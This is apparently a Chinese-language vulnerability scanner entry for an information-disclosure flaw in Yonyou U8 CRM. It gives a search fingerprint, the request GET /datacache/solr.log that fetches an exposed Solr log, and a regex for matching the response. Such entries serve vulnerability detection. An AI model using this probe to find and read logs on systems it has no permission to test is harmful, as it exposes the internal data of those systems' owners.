# 用友u8_crm存在solr信息泄露漏洞

用友 ｜ 信息泄露 ｜ —
- **指纹**：`body="用友U8CRM"`
- **请求**：`GET /datacache/solr.log HTTP/1.1`
- **响应特征**：200 ^(?=.*?solr)(?=.*?index).*?$